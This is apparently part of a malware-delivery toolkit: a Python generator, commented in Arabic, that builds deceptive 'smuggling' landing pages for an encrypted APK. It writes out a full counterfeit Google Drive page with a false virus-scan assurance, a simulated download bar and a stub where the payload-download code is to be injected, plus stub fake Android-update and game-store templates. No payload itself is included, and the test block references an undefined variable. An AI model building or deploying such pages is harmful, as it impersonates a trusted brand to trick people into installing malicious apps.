#!/usr/bin/env python3
"""
Landing Page Generator - مولد صفحات التهريب
يُنشئ صفحات ويب مخادعة تحتوي على APK مشفر
"""

import os
import random
from datetime import datetime

class LandingPageGenerator:
    def __init__(self):
        self.templates_dir = "crypter_engine/templates"
        self.output_dir = "generated_pages"
        
        os.makedirs(self.templates_dir, exist_ok=True)
        os.makedirs(self.output_dir, exist_ok=True)
        
        # إنشاء القوالب إذا لم تكن موجودة
        self._create_default_templates()
    
    def _create_default_templates(self):
        """إنشاء قوالب HTML افتراضية"""
        
        # قالب Google Drive محاكي
        google_drive_template = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Drive - ملفاتي</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: #f8f9fa; color: #333; line-height: 1.6; }
        
        .navbar {
            background: white;
            padding: 15px 30px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            display: flex;
            align-items: center;
            gap: 30px;
        }
        
        .logo { display: flex; align-items: center; gap: 10px; }
        .logo img { height: 40px; }
        .logo span { font-size: 22px; color: #4285f4; font-weight: 500; }
        
        .search-box {
            flex: 1;
            max-width: 600px;
            background: #f1f3f4;
            border-radius: 8px;
            padding: 10px 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .search-box input {
            border: none;
            background: transparent;
            width: 100%;
            font-size: 16px;
            outline: none;
        }
        
        .user-menu { display: flex; gap: 20px; align-items: center; }
        .user-avatar { width: 40px; height: 40px; border-radius: 50%; background: #4285f4; color: white; display: flex; align-items: center; justify-content: center; font-weight: bold; }
        
        .container {
            max-width: 1200px;
            margin: 40px auto;
            padding: 0 20px;
        }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }
        
        .breadcrumb {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #5f6368;
        }
        
        .btn-new {
            background: #4285f4;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .files-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 20px;
        }
        
        .file-card {
            background: white;
            border-radius: 8px;
            padding: 20px;
            text-align: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        
        .file-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 5px 20px rgba(0,0,0,0.15);
        }
        
        .file-icon {
            font-size: 48px;
            margin-bottom: 15px;
        }
        
        .file-name {
            font-weight: 500;
            margin-bottom: 5px;
            color: #333;
        }
        
        .file-info {
            font-size: 12px;
            color: #5f6368;
        }
        
        .download-section {
            background: white;
            border-radius: 8px;
            padding: 30px;
            margin-top: 40px;
            text-align: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        .download-btn {
            background: #34a853;
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            margin-top: 20px;
        }
        
        .loading {
            display: none;
            margin-top: 20px;
        }
        
        .progress-bar {
            width: 100%;
            height: 6px;
            background: #f1f3f4;
            border-radius: 3px;
            margin-top: 20px;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: #34a853;
            width: 0%;
            transition: width 0.5s;
        }
        
        .security-notice {
            background: #fef7e0;
            border: 1px solid #f8d7a4;
            border-radius: 4px;
            padding: 15px;
            margin-top: 30px;
            font-size: 14px;
            color: #856404;
        }
        
        .footer {
            text-align: center;
            margin-top: 60px;
            padding: 20px;
            color: #5f6368;
            font-size: 14px;
            border-top: 1px solid #eee;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        
        .pulse { animation: pulse 2s infinite; }
    </style>
</head>
<body>
    <!-- شريط التنقل -->
    <nav class="navbar">
        <div class="logo">
            <i class="fab fa-google-drive" style="color: #4285f4; font-size: 28px;"></i>
            <span>Google Drive</span>
        </div>
        
        <div class="search-box">
            <i class="fas fa-search" style="color: #5f6368;"></i>
            <input type="text" placeholder="بحث في Drive...">
        </div>
        
        <div class="user-menu">
            <i class="fas fa-th" style="color: #5f6368; font-size: 20px;"></i>
            <i class="fas fa-cog" style="color: #5f6368; font-size: 20px;"></i>
            <div class="user-avatar">M</div>
        </div>
    </nav>
    
    <!-- المحتوى الرئيسي -->
    <div class="container">
        <div class="header">
            <div class="breadcrumb">
                <i class="fas fa-home"></i>
                <span>/</span>
                <span>Drive الخاص بي</span>
                <span>/</span>
                <span style="color: #333; font-weight: 500;">الألعاب</span>
            </div>
            
            <button class="btn-new">
                <i class="fas fa-plus"></i>
                جديد
            </button>
        </div>
        
        <!-- شبكة الملفات -->
        <div class="files-grid">
            <div class="file-card">
                <div class="file-icon" style="color: #fbbc04;">
                    <i class="fas fa-file-archive"></i>
                </div>
                <div class="file-name">Dragon_Warrior_v2.5.apk</div>
                <div class="file-info">158 MB • تم التعديل اليوم</div>
            </div>
            
            <!-- ملفات وهمية أخرى -->
            <div class="file-card">
                <div class="file-icon" style="color: #ea4335;">
                    <i class="fas fa-file-pdf"></i>
                </div>
                <div class="file-name">مشروع الجامعة.pdf</div>
                <div class="file-info">4.2 MB • ٢ ديسمبر</div>
            </div>
            
            <div class="file-card">
                <div class="file-icon" style="color: #34a853;">
                    <i class="fas fa-file-image"></i>
                </div>
                <div class="file-name">صور الرحلة.zip</div>
                <div class="file-info">84 MB • ١ ديسمبر</div>
            </div>
            
            <div class="file-card">
                <div class="file-icon" style="color: #4285f4;">
                    <i class="fas fa-file-video"></i>
                </div>
                <div class="file-name">فيديو العرض.mp4</div>
                <div class="file-info">215 MB • ٣٠ نوفمبر</div>
            </div>
        </div>
        
        <!-- قسم التنزيل -->
        <div class="download-section">
            <h2 style="color: #333; margin-bottom: 15px;">
                <i class="fas fa-download" style="color: #4285f4;"></i>
                جاهز للتنزيل
            </h2>
            
            <p style="color: #5f6368; margin-bottom: 20px;">
                اضغط على الزر أدناه لبدء تنزيل ملف <strong>Dragon_Warrior_v2.5.apk</strong><br>
                سيكون الملف متاحاً لمدة 24 ساعة فقط
            </p>
            
            <button class="download-btn pulse" onclick="startDownload()">
                <i class="fas fa-download"></i>
                تنزيل الآن (158 MB)
            </button>
            
            <div class="loading" id="loading">
                <p style="color: #5f6368; margin-bottom: 10px;">جاري إعداد الملف للتنزيل...</p>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
            </div>
            
            <div class="security-notice">
                <i class="fas fa-shield-alt" style="margin-right: 10px;"></i>
                تم فحص هذا الملف بواسطة Google Drive ولم يتم العثور على فيروسات.
            </div>
        </div>
    </div>
    
    <!-- التذييل -->
    <div class="footer">
        <p>Google Drive • شروط الخدمة • سياسة الخصوصية • سياسة المحتوى</p>
        <p>© 2024 Google LLC. جميع الحقوق محفوظة.</p>
    </div>
    
    <!-- JavaScript للحقن -->
    <!-- INJECT_JS_HERE -->
    
    <script>
    // دالة محاكاة التنزيل
    function startDownload() {
        const btn = document.querySelector('.download-btn');
        const loading = document.getElementById('loading');
        const progressFill = document.getElementById('progressFill');
        
        btn.style.display = 'none';
        loading.style.display = 'block';
        
        // محاكاة التقدم
        let progress = 0;
        const interval = setInterval(() => {
            progress += Math.random() * 10;
            progressFill.style.width = Math.min(progress, 100) + '%';
            
            if (progress >= 100) {
                clearInterval(interval);
                
                // بعد اكتمال المحاكاة، تشغيل التنزيل الحقيقي
                setTimeout(() => {
                    downloadPayload();
                }, 500);
            }
        }, 200);
    }
    
    // هذه الدالة سيتم استبدالها بالكود المشفر
    function downloadPayload() {
        alert('جاري بدء التنزيل...');
        // الكود الحقيقي سيتم حقنه هنا
    }
    </script>
</body>
</html>"""
        
        # حفظ القالب
        template_path = os.path.join(self.templates_dir, "google_drive.html")
        with open(template_path, 'w', encoding='utf-8') as f:
            f.write(google_drive_template)
        
        # إنشاء قوالب أخرى بنفس الطريقة
        self._create_system_update_template()
        self._create_game_download_template()
    
    def _create_system_update_template(self):
        """قالب تحديث النظام"""
        template = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث النظام - Android Security Patch</title>
    <!-- ... كود مشابه لكن بتصميم تحديث نظام -->
</head>
<body>
    <!-- تصميم يبدو كتحديث نظام رسمي -->
</body>
</html>"""
        
        path = os.path.join(self.templates_dir, "system_update.html")
        with open(path, 'w', encoding='utf-8') as f:
            f.write(template)
    
    def _create_game_download_template(self):
        """قالب تحميل لعبة"""
        template = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحميل اللعبة - متجر الألعاب العربي</title>
    <!-- ... كود مشابه لكن بتصميم متجر ألعاب -->
</head>
<body>
    <!-- تصميم متجر ألعاب احترافي -->
</body>
</html>"""
        
        path = os.path.join(self.templates_dir, "game_download.html")
        with open(path, 'w', encoding='utf-8') as f:
            f.write(template)
    
    def get_template(self, template_name):
        """الحصول على قالب HTML"""
        template_path = os.path.join(self.templates_dir, f"{template_name}.html")
        
        if os.path.exists(template_path):
            with open(template_path, 'r', encoding='utf-8') as f:
                return f.read()
        else:
            # الرجوع للقالب الافتراضي
            default_path = os.path.join(self.templates_dir, "google_drive.html")
            with open(default_path, 'r', encoding='utf-8') as f:
                return f.read()
    
    def create_smuggling_page(self, encrypted_data, template_name="google_drive", file_name="game.apk"):
        """إنشاء صفحة تهريب كاملة"""
        
        # الحصول على القالب
        html_content = self.get_template(template_name)
        
        # إضافة معلومات الملف في مكان مناسب
        html_content = html_content.replace("Dragon_Warrior_v2.5.apk", file_name)
        
        # حساب حجم ملف وهمي
        file_size = random.randint(80, 250)
        html_content = html_content.replace("158 MB", f"{file_size} MB")
        
        # إضافة طابع زمني
        timestamp = datetime.now().strftime("تم التعديل %Y/%m/%d الساعة %H:%M")
        html_content = html_content.replace("تم التعديل اليوم", timestamp)
        
        return html_content
    
    def save_page(self, html_content, page_name=None):
        """حفظ الصفحة المولدة"""
        if page_name is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            page_name = f"landing_page_{timestamp}.html"
        
        output_path = os.path.join(self.output_dir, page_name)
        
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        return output_path

# اختبار المولد
if __name__ == "__main__":
    generator = LandingPageGenerator()
    
    # إنشاء صفحة تجريبية
    test_data = b"test" * 1000  # بيانات تجريبية
    html_page = generator.create_smuggling_page(
        encrypted_data=test_data,
        template_name="google_drive",
        file_name="Test_Game.apk"
    )
    
    # حفظ الصفحة
    saved_path = generator.save_page(html_page, "test_page.html")
    print(f"✓ تم إنشاء صفحة: {saved_path}")
    print(f"✓ حجم الصفحة: {len(html_content)} بايت")